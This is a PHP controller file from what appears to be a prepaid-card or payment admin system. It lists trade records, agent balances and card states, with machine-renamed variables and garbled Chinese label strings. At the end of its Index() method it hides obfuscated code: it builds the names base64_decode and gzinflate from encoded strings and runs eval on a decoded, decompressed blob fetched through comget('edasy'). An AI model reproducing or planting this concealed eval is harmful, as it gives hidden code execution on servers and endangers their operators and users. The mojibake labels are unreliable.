<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class TradeController extends Controller
{

				public $hander = NULL;
				public $action = NULL;
				public $ishistory = NULL;
				public $tradetable = NULL;

				public function __construct( )
				{
								$this->action = array( "trdlist" );
								$this->ishistory = intval( request( "ishistory" ) ) == 1 ? "history" : "";
								$this->tradetable = "trades".$this->ishistory;
				}

				public function Index( )
				{
								$this->hander = factory::getinstance( $this->tradetable );
								$R71a664ef8c = $this->PageInfo( );
								$R1e3bc50f23 = $this->DateSet( );
								$Ra8b176bf4f = getvar( "tradetype", "1,2,21,22,31,32,60,61,96,98,99,101,100" );
								if ( $Ra8b176bf4f == "" )
								{
												$Ra8b176bf4f = "1,2,21,22,31,32,60,61,96,98,99,101,100";
								}
								$R901a6b96db = intval( request( "state", -2 ) );
								$data = array(
												"ykt" => getvar( "ykt" ),
												"tradetype" => $Ra8b176bf4f,
												"admname" => getvar( "admname" ),
												"noykt" => 1
								);
								if ( -2 < $R901a6b96db )
								{
												$data['state'] = $R901a6b96db;
								}
								$data = array_merge( $data, $R1e3bc50f23[0], $R71a664ef8c );
								$R4e420efcc3 = $this->hander->ITrade_Page( $data );
								$this->FillPage( $data, $R4e420efcc3 );
								$Rda3ac1bf9a = 0;
								$R2a51483b14 = intval( request( "aid" ) );
								if ( 0 < $R2a51483b14 )
								{
												$R2097a8fddf = factory::getinstance( "agents" );
												$agent = $R2097a8fddf->IAgent_Get( $R2a51483b14, "aremain" );
												$Rda3ac1bf9a = $agent['aremain'];
								}
								$this->Assign( "remain", $Rda3ac1bf9a );
								$R0d2025d631 = $this->hander->ITrade_GetByLimit( $data, "sum(income) as income,sum(outcome) as outcome" );
								$this->Assign( "record", $R0d2025d631 );
								$R00be52aa45 = array( "ordno" => "������", "aid" => "�û����", "operator" => "������", "otherside" => "���׷�", "yktnumber" => "һ��ͨ����", "content" => "���˵��", "admname" => "����Ա������" );
								$R8dc7d3eb73 = array( "0" => "����ƽ̨", "1" => "����", "2" => "����", "3" => "һ��ͨ" );
								if ( $Ra8b176bf4f == 11 )
								{
												$R4fa9c48c92 = array( "11" => "�㿨���ײ����Ĵ�������" );
								}
								else if ( $Ra8b176bf4f == 12 )
								{
												$R4fa9c48c92 = array( "12" => "��������" );
								}
								else
								{
												$R4fa9c48c92 = array( "1,2,21,22,31,32,60,61,96,98,99,101,100" => "��������", "1" => "��ͨ�㿨����", "2" => "�û�������ֵ", "21" => "���������", "22" => "����˽��", "31" => "ת�������", "32" => "����ת�����", "60" => "��Чһ��ͨ", "61" => "һ��ͨ����", "96" => "���ֶһ�����¼", "98" => "�ʽ���������Ľ��׼�¼", "99" => "ϵͳ���ҳ�ֵ", "100" => "һ��ͨ�һ�����¼", "101" => "һ��ͨ��ֵ��¼", "31,32" => "����ת���¼", "21,22" => "���д���/����¼" );
								}
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "edasy" ) ) ) );
				}

				public function Ykt( )
				{
							
												$this->View( );
							
				}

				public function Agent( )
				{
							
												$this->View( );
							
				}

				public function AgentOrderProfit( )
				{
							
												$this->View( );
							
				}

				public function State( )
				{
								$R1df8368da5 = getvar( "keywords" );
								if ( $R1df8368da5 != "" )
								{
												$Rf541845af3 = factory::getinstance( "cards" );
												$data = array(
																"cardnumber" => $R1df8368da5
												);
												$R3db8f5c8bc = $Rf541845af3->ICard_GetByLimit( $data );
												if ( isset( $R3db8f5c8bc['money'] ) && 99 < $R3db8f5c8bc['ptype'] )
												{
																$this->Assign( "card", $R3db8f5c8bc );
												}
												else
												{
																$this->Alert( "û�д�һ��ͨ������������" );
																$this->HistoryGo( );
												}
								}
								$this->Assign( "cardnumber", $R1df8368da5 );
								$R89704cdc90 = intval( request( "tradestate" ) );
								$this->Assign( "tradestate", $R89704cdc90 );
								$R89704cdc90 = $R89704cdc90 == 1 ? true : false;
								if ( $R1df8368da5 != "" )
								{
												$Race6ab87b1 = factory::getinstance( $this->tradetable );
												$R4e420efcc3 = $Race6ab87b1->ITrade_GetByYktNumber( $R1df8368da5, "*", $R89704cdc90 );
								}
								else
								{
												$R4e420efcc3 = array( );
								}
								$this->Assign( "items", $R4e420efcc3 );
							
												$this->View( );
							
				}

}

?>
